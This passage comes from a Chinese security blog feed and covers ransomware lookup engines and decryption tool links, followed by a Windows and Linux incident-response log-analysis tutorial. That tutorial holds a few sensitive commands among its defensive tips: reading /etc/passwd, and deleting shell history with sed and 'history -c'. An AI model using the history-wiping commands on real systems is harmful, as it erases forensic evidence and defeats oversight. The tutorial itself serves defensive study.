title="前言"></a>前言</h3><p>经常会有一些小伙伴问：中了勒索病毒，该怎么办，可以解密吗？</p><p>第一次遇到勒索病毒是在早几年的时候，客户因网站访问异常，进而远程协助进行排查。登录服务器，在站点目录下发现所有的脚本文件及附件后缀名被篡改，每个文件夹下都有一个文件打开后显示勒索提示信息，这便是勒索病毒的特征。</p><p>出于职业习惯，我打包了部分加密文件样本和勒索病毒提示信息用于留档，就在今天，我又重新上传了样本，至今依然无法解密。</p><p>作为一个安全工程师，而非一个专业的病毒分析师，我们可以借助各大安全公司的能力，寻找勒索病毒的解密工具。</p><p>本文整理了一份勒索病毒自救指南，通过勒索病毒索引引擎查找勒索病毒相关信息，再通过各个安全公司提供的免费勒索软件解密工具解密。当然，能否解密全凭运气，so，平时还是勤打补丁多备份。</p><p><strong>一、勒索病毒搜索引擎</strong></p><p>在勒索病毒搜索引擎输入病毒名、勒索邮箱、被加密后文件的后缀名，或直接上传被加密文件、勒索提示信息，即可可快速查找到病毒详情和解密工具。</p><p><img src="/image/media/2022/secops/20200406-1.png"></p><p>这些网站的解密能力还在持续更新中，是值得收藏的几个勒索病毒工具型网站。</p><p>【360】 勒索病毒搜索引擎，支持检索超过800种常见勒索病毒</p><p>官网：<a href="http://lesuobingdu.360.cn/">http://lesuobingdu.360.cn</a></p><p>【腾讯】 勒索病毒搜索引擎，支持检索超过 300 种常见勒索病毒</p><p>官网：<a href="https://guanjia.qq.com/pr/ls">https://guanjia.qq.com/pr/ls</a></p><p>【启明】VenusEye勒索病毒搜索引擎，超300种勒索病毒家族</p><p>官网：<a href="https://lesuo.venuseye.com.cn/">https://lesuo.venuseye.com.cn</a></p><p>【奇安信】勒索病毒搜索引擎</p><p>官网：<a href="https://lesuobingdu.qianxin.com/">https://lesuobingdu.qianxin.com</a></p><p>【深信服】勒索病毒搜索引擎</p><p>官网：<a href="https://edr.sangfor.com.cn/#/information/ransom_search">https://edr.sangfor.com.cn/#/information/ransom_search</a></p><hr><p><strong>二、勒索软件解密工具集</strong></p><p>很多安全公司都提供了免费的勒索病毒解密工具下载，收集和整理相关下载地址，可以帮助我们了解和获取最新的勒索病毒解密工具。</p><p>【腾讯哈勃】勒索软件专杀工具</p><p>官网：<a href="https://habo.qq.com/tool">https://habo.qq.com/tool</a></p><p>【金山毒霸】勒索病毒免疫工具</p><p>官网：<a href="http://www.duba.net/dbt/wannacry.html">http://www.duba.net/dbt/wannacry.html</a></p><p>【火绒】安全工具下载</p><p>官网：<a href="http://bbs.huorong.cn/forum-55-1.html">http://bbs.huorong.cn/forum-55-1.html</a></p><p>【瑞星】解密工具下载</p><p>官网：<a href="http://it.rising.com.cn/fanglesuo/index.html">http://it.rising.com.cn/fanglesuo/index.html</a></p><p>【nomoreransom】勒索软件解密工具集</p><p>官网：<a href="https://www.nomoreransom.org/zh/index.html">https://www.nomoreransom.org/zh/index.html</a></p><p>【MalwareHunterTeam】勒索软件解密工具集</p><p>官网：<a href="https://id-ransomware.malwarehunterteam.com/">https://id-ransomware.malwarehunterteam.com</a></p><p>【卡巴斯基】免费勒索解密器</p><p>官网：<a href="https://noransom.kaspersky.com/">https://noransom.kaspersky.com</a></p><p>【Avast】免费勒索软件解密工具</p><p>官网：<a href="https://www.avast.com/zh-cn/ransomware-decryption-tools">https://www.avast.com/zh-cn/ransomware-decryption-tools</a></p><p>【Emsisoft】免费勒索软件解密工具</p><p>官网：<a href="https://www.emsisoft.com/ransomware-decryption-tools/free-download">https://www.emsisoft.com/ransomware-decryption-tools/free-download</a></p><p>【GitHub 项目】勒索病毒解密工具收集汇总</p><p>官网：<a href="https://github.com/jiansiting/Decryption-Tools">https://github.com/jiansiting/Decryption-Tools</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应急响应之日志分析</title>
      <link href="/article/2022-07-02-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B9%8B%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
      <url>/article/2022-07-02-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B9%8B%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>学习一下应急响应之日志分析。</p><span id="more"></span><h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><h2 id="Windows日志分析"><a href="#Windows日志分析" class="headerlink" title="Windows日志分析"></a>Windows日志分析</h2><h3 id="0x01-Windows事件日志简介"><a href="#0x01-Windows事件日志简介" class="headerlink" title="0x01 Windows事件日志简介"></a>0x01 Windows事件日志简介</h3><p>Windows系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。</p><p>Windows主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志。</p><p><strong>系统日志</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型由Windows NT/2000操作系统预先定义。</span><br><span class="line"></span><br><span class="line">默认位置： %SystemRoot%\System32\Winevt\Logs\System.evtx</span><br></pre></td></tr></table></figure><p><strong>应用程序日志</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。 </span><br><span class="line"></span><br><span class="line">默认位置：%SystemRoot%\System32\Winevt\Logs\Application.evtx</span><br></pre></td></tr></table></figure><p><strong>安全日志</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。</span><br><span class="line"></span><br><span class="line">默认位置：%SystemRoot%\System32\Winevt\Logs\Security.evtx</span><br></pre></td></tr></table></figure><p>​    系统和应用程序日志存储着故障排除信息，对于系统管理员更为有用。 安全日志记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么，对于调查人员而言，更有帮助。 </p><h3 id="0X02-审核策略与事件查看器"><a href="#0X02-审核策略与事件查看器" class="headerlink" title="0X02 审核策略与事件查看器"></a>0X02 审核策略与事件查看器</h3><p>Windows Server 2008 R2 系统的审核功能在默认状态下并没有启用 ，建议开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p><p>PS：默认状态下，也会记录一些简单的日志，日志默认大小20M</p><p><strong>设置1</strong>：开始 → 管理工具 → 本地安全策略 → 本地策略 → 审核策略，参考配置操作：</p><p><img src="/image/media/2022/secops/log-1-1.png"></p><p><strong>设置2</strong>：设置合理的日志属性，即日志最大大小、事件覆盖阀值等： </p><p><img src="/image/media/2022/secops/log-1-2.png"></p><p><strong>查看系统日志方法：</strong></p><ol><li><p>在<strong>“开始”</strong>菜单上，依次指向<strong>“所有程序”</strong>、<strong>“管理工具”</strong>，然后单击<strong>“事件查看器”</strong></p></li><li><p>按 “<strong>Window+R</strong>“，输入 ”<strong>eventvwr.msc</strong>“ 也可以直接进入“<strong>事件查看器</strong>” </p><p><img src="/image/media/2022/secops/log-1-3.png"></p></li></ol><h3 id="0x03-事件日志分析"><a href="#0x03-事件日志分析" class="headerlink" title="0x03 事件日志分析"></a>0x03 事件日志分析</h3><p>对于Windows事件日志分析，不同的EVENT ID代表了不同的意义，摘录一些常见的安全事件的说明：</p><table><thead><tr><th align="left">事件ID</th><th>说明</th></tr></thead><tbody><tr><td align="left">4624</td><td>登录成功</td></tr><tr><td align="left">4625</td><td>登录失败</td></tr><tr><td align="left">4634</td><td>注销成功</td></tr><tr><td align="left">4647</td><td>用户启动的注销</td></tr><tr><td align="left">4672</td><td>使用超级用户（如管理员）进行登录</td></tr><tr><td align="left">4720</td><td>创建用户</td></tr></tbody></table><p>每个成功登录的事件都会标记一个登录类型，不同登录类型代表不同的方式：</p><table><thead><tr><th align="left">登录类型</th><th>描述</th><th>说明</th></tr></thead><tbody><tr><td align="left">2</td><td>交互式登录（Interactive）</td><td>用户在本地进行登录。</td></tr><tr><td align="left">3</td><td>网络（Network）</td><td>最常见的情况就是连接到共享文件夹或共享打印机时。</td></tr><tr><td align="left">4</td><td>批处理（Batch）</td><td>通常表明某计划任务启动。</td></tr><tr><td align="left">5</td><td>服务（Service）</td><td>每种服务都被配置在某个特定的用户账号下运行。</td></tr><tr><td align="left">7</td><td>解锁（Unlock）</td><td>屏保解锁。</td></tr><tr><td align="left">8</td><td>网络明文（NetworkCleartext）</td><td>登录的密码在网络上是通过明文传输的，如FTP。</td></tr><tr><td align="left">9</td><td>新凭证（NewCredentials）</td><td>使用带/Netonly参数的RUNAS命令运行一个程序。</td></tr><tr><td align="left">10</td><td>远程交互，（RemoteInteractive）</td><td>通过终端服务、远程桌面或远程协助访问计算机。</td></tr><tr><td align="left">11</td><td>缓存交互（CachedInteractive）</td><td>以一个域用户登录而又没有域控制器可用</td></tr></tbody></table><p>关于更多EVENT ID，详见微软官方网站上找到了“Windows Vista 和 Windows Server 2008 中的安全事件的说明”。</p><blockquote><p>原文链接 ：<a href="https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008">https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008</a></p></blockquote><p>案例1：可以利用eventlog事件来查看系统账号登录情况：</p><ol><li><p>在<strong>“开始”</strong>菜单上，依次指向<strong>“所有程序”</strong>、<strong>“管理工具”</strong>，然后单击<strong>“事件查看器”</strong>；</p></li><li><p>在事件查看器中，单击<strong>“安全”</strong>，查看安全日志；</p></li><li><p>在安全日志右侧操作中，点击<strong>“筛选当前日志”</strong>，输入事件ID进行筛选。</p><p>4624  –登录成功<br>4625  –登录失败<br>4634 – 注销成功<br>4647 – 用户启动的注销<br>4672 – 使用超级用户（如管理员）进行登录</p></li></ol><p>我们输入事件ID：4625进行日志筛选，发现事件ID：4625，事件数175904，即用户登录失败了175904次，那么这台服务器管理员账号可能遭遇了暴力猜解。</p><p><img src="/image/media/2022/secops/log-1-4.png"></p><p>案例2：可以利用eventlog事件来查看计算机开关机的记录： </p><p>1、在<strong>“开始”</strong>菜单上，依次指向<strong>“所有程序”</strong>、<strong>“管理工具”</strong>，然后单击<strong>“事件查看器”</strong>；</p><p>2、在事件查看器中，单击<strong>“系统”</strong>，查看系统日志；</p><p>3、在系统日志右侧操作中，点击<strong>“筛选当前日志”</strong>，输入事件ID进行筛选。</p><p>其中事件ID 6006 ID6005、 ID 6009就表示不同状态的机器的情况（开关机）。<br>    6005 信息 EventLog 事件日志服务已启动。(开机)<br>    6006 信息 EventLog 事件日志服务已停止。(关机)<br>    6009 信息 EventLog 按ctrl、alt、delete键(非正常)关机</p><p>我们输入事件ID：6005-6006进行日志筛选，发现了两条在2018/7/6 17:53:51左右的记录，也就是我刚才对系统进行重启的时间。</p><p><img src="/image/media/2022/secops/log-1-5.png"></p><h3 id="0x04-日志分析工具"><a href="#0x04-日志分析工具" class="headerlink" title="0x04 日志分析工具"></a>0x04 日志分析工具</h3><h4 id="Log-Parser"><a href="#Log-Parser" class="headerlink" title="Log Parser"></a>Log Parser</h4><p>Log Parser（是微软公司出品的日志分析工具，它功能强大，使用简单，可以分析基于文本的日志文件、XML 文件、CSV（逗号分隔符）文件，以及操作系统的事件日志、注册表、文件系统、Active Directory。它可以像使用 SQL 语句一样查询分析这些数据，甚至可以把分析结果以各种图表的形式展现出来。</p><p>Log Parser 2.2下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a></p><p>Log Parser 使用示例：<a href="https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/">https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/</a></p><p><img src="/image/media/2022/secops/log-1-6.png"></p><p><strong>基本查询结构</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Logparser.exe –i:EVT –o:DATAGRID &quot;SELECT * FROM c:\xx.evtx&quot;</span><br></pre></td></tr></table></figure><p><strong>使用Log Parser分析日志</strong></p><p>1、查询登录成功的事件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">登录成功的所有事件</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\Security.evtx where EventID=4624&quot;</span><br><span class="line"></span><br><span class="line">指定登录时间范围的事件：</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\Security.evtx where TimeGenerated&gt;&#x27;2018-06-19 23:32:11&#x27; and TimeGenerated&lt;&#x27;2018-06-20 23:34:00&#x27; and EventID=4624&quot;</span><br><span class="line"></span><br><span class="line">提取登录成功的用户名和IP：</span><br><span class="line">LogParser.exe -i:EVT  –o:DATAGRID  &quot;SELECT EXTRACT_TOKEN(Message,13,&#x27; &#x27;) as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,&#x27;|&#x27;) as Username,EXTRACT_TOKEN(Message,38,&#x27; &#x27;) as Loginip FROM c:\Security.evtx where EventID=4624&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> 2、查询登录失败的事件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">登录失败的所有事件：</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\Security.evtx where EventID=4625&quot;</span><br><span class="line"></span><br><span class="line">提取登录失败用户名进行聚合统计：</span><br><span class="line">LogParser.exe  -i:EVT &quot;SELECT  EXTRACT_TOKEN(Message,13,&#x27; &#x27;)  as EventType,EXTRACT_TOKEN(Message,19,&#x27; &#x27;) as user,count(EXTRACT_TOKEN(Message,19,&#x27; &#x27;)) as Times,EXTRACT_TOKEN(Message,39,&#x27; &#x27;) as Loginip FROM c:\Security.evtx where EventID=4625 GROUP BY Message&quot; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3、系统历史开关机记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT TimeGenerated,EventID,Message FROM c:\System.evtx where EventID=6005 or EventID=6006&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="LogParser-Lizard"><a href="#LogParser-Lizard" class="headerlink" title="LogParser Lizard"></a>LogParser Lizard</h4><p>对于GUI环境的Log Parser Lizard，其特点是比较易于使用，甚至不需要记忆繁琐的命令，只需要做好设置，写好基本的SQL语句，就可以直观的得到结果。</p><p>下载地址：<a href="http://www.lizard-labs.com/log_parser_lizard.aspx">http://www.lizard-labs.com/log_parser_lizard.aspx</a></p><p>依赖包：Microsoft .NET Framework 4 .5，下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=42642">https://www.microsoft.com/en-us/download/details.aspx?id=42642</a></p><p>查询最近用户登录情况：</p><p><img src="/image/media/2022/secops/log-1-7.png"></p><h4 id="Event-Log-Explorer"><a href="#Event-Log-Explorer" class="headerlink" title="Event Log Explorer"></a>Event Log Explorer</h4><p>Event Log Explorer是一款非常好用的Windows日志分析工具。可用于查看，监视和分析跟事件记录，包括安全，系统，应用程序和其他微软Windows 的记录被记载的事件，其强大的过滤功能可以快速的过滤出有价值的信息。</p><p>下载地址：<a href="https://event-log-explorer.en.softonic.com/">https://event-log-explorer.en.softonic.com/</a></p><p><img src="/image/media/2022/secops/log-1-8.png"></p><p>参考链接：</p><p>Windows日志分析   <a href="https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ">https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ</a></p><h2 id="Linux日志分析"><a href="#Linux日志分析" class="headerlink" title="Linux日志分析"></a>Linux日志分析</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>Linux系统拥有非常灵活和强大的日志功能，可以保存几乎所有的操作记录，并可以从中检索出我们需要的信息。 本文简介一下Linux系统日志及日志分析技巧。</p><h3 id="0x01-日志简介"><a href="#0x01-日志简介" class="headerlink" title="0x01 日志简介"></a>0x01 日志简介</h3><p>日志默认存放位置：/var/log/</p><p>查看日志配置情况：more /etc/rsyslog.conf</p><table><thead><tr><th align="center">日志文件</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">/var/log/cron</td><td align="center">记录了系统定时任务相关的日志</td></tr><tr><td align="center">/var/log/cups</td><td align="center">记录打印信息的日志</td></tr><tr><td align="center">/var/log/dmesg</td><td align="center">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td></tr><tr><td align="center">/var/log/mailog</td><td align="center">记录邮件信息</td></tr><tr><td align="center">/var/log/message</td><td align="center">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td></tr><tr><td align="center">/var/log/btmp</td><td align="center">记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td></tr><tr><td align="center">/var/log/lastlog</td><td align="center">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td></tr><tr><td align="center">/var/log/wtmp</td><td align="center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td></tr><tr><td align="center">/var/log/utmp</td><td align="center">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td></tr><tr><td align="center">/var/log/secure</td><td align="center">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td></tr></tbody></table><p>比较重要的几个日志：<br>    登录失败记录：/var/log/btmp     //lastb<br>    最后一次登录：/var/log/lastlog  //lastlog<br>    登录成功记录: /var/log/wtmp     //last<br>    登录日志记录：/var/log/secure   </p><p>​    目前登录用户信息：/var/run/utmp  //w、who、users</p><p>​    历史命令记录：history<br>​    仅清理当前用户： history -c</p><h3 id="0x02-日志分析技巧"><a href="#0x02-日志分析技巧" class="headerlink" title="0x02 日志分析技巧"></a>0x02 日志分析技巧</h3><h4 id="A、常用的shell命令"><a href="#A、常用的shell命令" class="headerlink" title="A、常用的shell命令"></a>A、常用的shell命令</h4><p>Linux下常用的shell命令如：find、grep 、egrep、awk、sed</p><p>小技巧：</p><p>1、grep显示前后几行信息:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">标准unix/linux下的grep通过下面參数控制上下文：</span><br><span class="line">​grep -C 5 foo file 显示file文件里匹配foo字串那行以及上下5行</span><br><span class="line">​grep -B 5 foo file 显示foo及前5行</span><br><span class="line">​grep -A 5 foo file 显示foo及后5行</span><br><span class="line">​查看grep版本号的方法是</span><br><span class="line">​grep -V</span><br></pre></td></tr></table></figure><p>2、grep 查找含有某字符串的所有文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">grep -rn &quot;hello,world!&quot; </span><br><span class="line">* : 表示当前目录所有文件，也可以是某个文件名</span><br><span class="line">-r 是递归查找</span><br><span class="line">-n 是显示行号</span><br><span class="line">-R 查找所有文件包含子目录</span><br><span class="line">-i 忽略大小写</span><br></pre></td></tr></table></figure><p>3、如何显示一个文件的某几行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat input_file | tail -n +1000 | head -n 2000</span><br><span class="line">#从第1000行开始，显示2000行。即显示1000~2999行</span><br></pre></td></tr></table></figure><p>4、find /etc -name init </p><pre><code>//在目录/etc中查找文件init</code></pre><p>5、只是显示/etc/passwd的账户</p><pre><code>`cat /etc/passwd |awk  -F &#39;:&#39;  &#39;&#123;print $1&#125;&#39;`  //awk -F指定域分隔符为&#39;:&#39;，将记录按指定的域分隔符划分域，填充域，​$0则表示所有域,$1表示第一个域,​$n表示第n个域。</code></pre><p>6、sed -i ‘153,$d’ .bash_history</p><pre><code>删除历史操作记录，只保留前153行</code></pre><h4 id="B、日志分析技巧"><a href="#B、日志分析技巧" class="headerlink" title="B、日志分析技巧"></a>B、日志分析技巧</h4><p><strong>A、/var/log/secure</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1、定位有多少IP在爆破主机的root帐号：    </span><br><span class="line">grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">定位有哪些IP在爆破：</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class="line"></span><br><span class="line">爆破用户名字典是什么？</span><br><span class="line"> grep &quot;Failed password&quot; /var/log/secure|perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;|uniq -c|sort -nr</span><br><span class="line"> </span><br><span class="line">2、登录成功的IP有哪些： </span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">登录成功的日期、用户名、IP：</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27; </span><br><span class="line"></span><br><span class="line">3、增加一个用户kali日志：</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali</span><br><span class="line">, shell=/bin/bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span><br><span class="line">#grep &quot;useradd&quot; /var/log/secure </span><br><span class="line"></span><br><span class="line">4、删除用户kali日志：</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete user &#x27;kali&#x27;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class="line"># grep &quot;userdel&quot; /var/log/secure</span><br><span class="line"></span><br><span class="line">5、su切换用户：</span><br><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)</span><br><span class="line"></span><br><span class="line">sudo授权执行:</span><br><span class="line">sudo -l</span><br><span class="line">Jul 10 00:43:09 localhost sudo:    good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now</span><br></pre></td></tr></table></figure><p><strong>2、/var/log/yum.log</strong></p><p>软件安装升级卸载日志：</p><figure class="highlight plaintext"><figcaption><span>install gcc</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">yum install gcc</span><br><span class="line"></span><br><span class="line">[root@bogon ~]# more /var/log/yum.log</span><br><span class="line"></span><br><span class="line">Jul 10 00:18:23 Updated: cpp-4.8.5-28.el7_5.1.x86_64</span><br><span class="line">Jul 10 00:18:24 Updated: libgcc-4.8.5-28.el7_5.1.x86_64</span><br><span class="line">Jul 10 00:18:24 Updated: libgomp-4.8.5-28.el7_5.1.x86_64</span><br><span class="line">Jul 10 00:18:28 Updated: gcc-4.8.5-28.el7_5.1.x86_64</span><br><span class="line">Jul 10 00:18:28 Updated: libgcc-4.8.5-28.el7_5.1.i686</span><br></pre></td></tr></table></figure><h3 id="0x03-linux常用命令"><a href="#0x03-linux常用命令" class="headerlink" title="0x03 linux常用命令"></a>0x03 linux常用命令</h3><h4 id="find"><a href="#find" class="headerlink" title="find"></a>find</h4><p>find 命令用来在指定目录下查找文件。任何位于参数之前的字符串都将被视为欲查找的目录名。如果使用该命令时，不设置任何参数，则 find 命令将在当前目录下查找子目录与文件。并且将查找到的子目录和文件全部进行显示。</p><ul><li><p>将当前目录及其子目录下所有文件后缀为 .c 的文件列出来：</p><ul><li>find . -name “*.c“</li></ul></li><li><p>将当前目录及其子目录下所有最近 20 天内更新过的文件列出：</p><ul><li><p>find . -ctime 20</p></li><li><p>-amin n : 在过去 n 分钟内被读取过</p></li><li><p>-anewer file : 比文件 file 更晚被读取过的文件</p></li><li><p>-atime n : 在过去 n 天内被读取过的文件</p></li><li><p>-cmin n : 在过去 n 分钟内被修改过</p></li></ul></li></ul><h4 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h4><p>grep 命令用于查找文件里符合条件的字符串。grep 指令用于查找内容包含指定的范本样式的文件，如果发现某文件的内容符合所指定的范本样式，预设 grep 指令会把含有范本样式的那一列显示出来。若不指定任何文件名称，或是所给予的文件名为 -，则 grep 指令会从标准输入设备读取数据。</p><ul><li><p>从文件内容查找匹配指定字符串的行：</p><ul><li>grep “被查找的字符串” 文件名</li></ul></li><li><p>显示文件里匹配指定字串那行以及上下5行：</p><ul><li>grep -C 5 “被查找的字符串” 文件名</li></ul></li><li><p>从文件内容查找与正则表达式匹配的行：# $ grep –e “正则表达式” 文件名</p></li><li><p>grep -r ‘flag{‘ /</p></li></ul><p>egrep命令用于在文件内查找指定的字符串。egrep执行效果与”grep-E”相似，使用的语法及参数可参照grep指令，与grep的不同点在于解读字符串的方法。</p><ul><li>查找当前目录下包含字符串“Linux”的文件 ：<ul><li>egrep Linux *</li></ul></li></ul><h4 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h4><p>awk是一种处理文本文件的语言，是一个强大的文本分析工具。</p><ul><li><p>过滤第一列大于2的行：</p><ul><li>awk ‘$1&gt;2’ 文件名</li></ul></li><li><p>过滤第一列等于2的行：</p><ul><li>awk ‘$1==2 {print $1,$3}’文件名</li></ul></li><li><p>过滤第一列大于2并且第二列等于’Are’的行：</p><ul><li>awk ‘$1&gt;2 &amp;&amp; $2==”Are” {print $1,$2,$3}’文件名</li></ul></li><li><p>grep “Accepted “ /var/log/文件| awk ‘{print $1,$2,$3,$9,$11}’ </p></li></ul><h4 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h4><p>sed 命令是利用脚本来处理文本文件。sed 可依照脚本的指令来处理、编辑文本文件。Sed 主要用来自动编辑一个或多个文件、简化对文件的反复操作、编写转换程序等。</p><ul><li><p>sed 可以用行为单位进行部分数据的查找与替换：</p><ul><li>sed ‘s/要被取代的字串/新的字串/g’</li></ul></li><li><p>将 testfile 文件中每行第一次出现的 oo 用字符串 kk 替换，然后将该文件内容输出到标准输出：</p><ul><li>sed -e ‘s/oo/kk/‘ 